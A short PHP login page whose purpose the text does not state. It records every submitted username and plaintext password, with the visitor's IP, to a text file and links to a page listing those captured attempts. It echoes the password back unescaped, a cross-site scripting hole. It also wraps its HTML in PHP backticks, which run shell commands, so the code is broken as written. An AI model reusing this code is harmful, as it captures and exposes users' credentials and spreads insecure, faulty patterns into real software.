<?php
    $uname = $_POST["uname"];
    $psw = $_POST["psw"];
    $remember = $_POST["remember"];
    $show_login = true;

    if ($_POST["remember"] == "on") {
        $remember = "Yes";
    } else {
        $remember = "No";
    }
    if ($uname != "" && $psw != "" && $remember != ""){   
        $show_login = false;
        $date = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'];
        $log = $date . " | IP: " . $ip . " | Username: " . $uname . " | Password: " . $psw . " | Remember: " . $remember . "\n";
        file_put_contents('login_attempts.txt', $log, FILE_APPEND);
    }
?>
<?php
if ($show_login) {
    echo `
    <!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}

input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  background-color: #04AA6D;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}

.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
  position: relative;
}

img.avatar {
  width: 15%;
  border-radius: 50%;
}

.container {
  padding: 16px;
}

span.psw {
  float: right;
  padding-top: 16px;
}

.login {
  background-color: #fefefe;
  margin: 5% auto;
  border: 1px solid #888;
  width: 80%;
}

@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>
</head>
<body>
<form class="login" action="login.php" method="post">
    <div class="imgcontainer">
      <img src="img_avatar2.png" alt="Avatar" class="avatar">
    </div>
    <div class="container">
      <label for="uname"><b>Username</b></label>
      <input type="text" placeholder="Enter Username" name="uname" required>

      <label for="psw"><b>Password</b></label>
      <input type="password" placeholder="Enter Password" name="psw" required>
        
      <button type="submit">Login</button>
      <label>
        <input type="checkbox" checked="checked" name="remember"> Remember me
      </label>
    </div>
  </form>
</body>
</html>
`;
} else {
    echo `
    <html>
<body>

Welcome `.$uname.`<br>
Your password is: `.$psw.`<br>
Should I remember you? `.$remember.`<br>

See login Attempts <a href="logs.php">here</a>
</body>
</html>
`;
}
?>